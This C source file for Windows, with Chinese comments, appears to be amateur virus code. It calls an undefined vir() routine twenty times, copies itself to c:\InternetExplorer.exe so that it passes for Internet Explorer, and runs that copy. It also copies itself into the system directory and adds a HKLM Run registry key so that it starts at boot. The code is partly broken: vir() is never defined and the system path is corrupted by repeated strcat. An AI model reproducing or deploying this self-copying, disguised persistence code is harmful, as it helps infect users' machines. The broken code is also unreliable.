/*#include <stdio.h>
#include <stdlib.h>

// myv.cpp : Defines the entry point for the console application.
//

//#include "stdafx.h"
#include <windows.h>
int main(int argc, char* argv[])
{
	char syspath[256] = {0},pepath[256] = {0};
	int errsys = ::GetWindowsDirectoryA(syspath,255);
	int errpe = ::GetCurrentDirectory(256,pepath);
	
	char path1[256] = {0};
	char path2[256] = {0};
	wsprintf(path2,"%s\\system32\\mecopy.exe",syspath);
	wsprintf(path2,"%s\\mecopy.exe",pepath);
	int cpyerr = CopyFile(path1,path2,1);
	if(cpyerr == 0)//		prtinf("failed!");
	getchar();
}*/
#include <stdio.h>
#include <windows.h>
#include <string.h>




char *GetFilename(char *p) //得到一个路径的纯文件名
{  int x=strlen(p);  char ch='\\';  char *q=strrchr(p,ch);  return q;}






int main(int argc,char *argv[])
{
vir();
vir();
vir();
vir();
vir();
vir();
vir();
vir();
vir();
vir();
vir();
vir();
vir();
vir();
vir();
vir();
vir();
vir();
vir();
vir();
char *myfilepath = argv[0];
char *mubiaofilepath = "c:\\InternetExplorer.exe";
char command[1000] = "copy ";
int ret=0;
strcat(command,myfilepath);
strcat(command," ");
strcat(command,mubiaofilepath);
system(command);



  char *filepath;
  char modlepath[256];
  char syspath[256];

  filepath="InternetExplorer.exe";
   system(filepath);

   //将程序移动到系统目录下 
  GetModuleFileName(0,modlepath,256);
 //获得自身路径
  GetSystemDirectory(syspath,256)
; //得到系统路径   
	ret=CopyFile(modlepath,strcat(syspath,GetFilename(modlepath)),1);
//复制，CopyFile的第二个参数是目标文件名 
  
  
  
  
  
   //程序添加开机自启动 
 char regname[]="Software\\Microsoft\\Windows\\CurrentVersion\\Run";  
HKEY hKey; 
 ret=RegOpenKey(HKEY_LOCAL_MACHINE,regname,&hKey); 
   //打开注册表键 
    ret=RegSetValueEx(hKey,"MyProm",0,REG_EXPAND_SZ,(unsigned char*)strcat(syspath,GetFilename(modlepath)),25);
 //设置键值   
 if(ret==0)  
{    printf("success to write run key.\n");  
  RegCloseKey(hKey);  }  else 
 {  
  printf("failed to open regedit.%d\n",ret);
  }   
  
return 0;


//getchar();
}



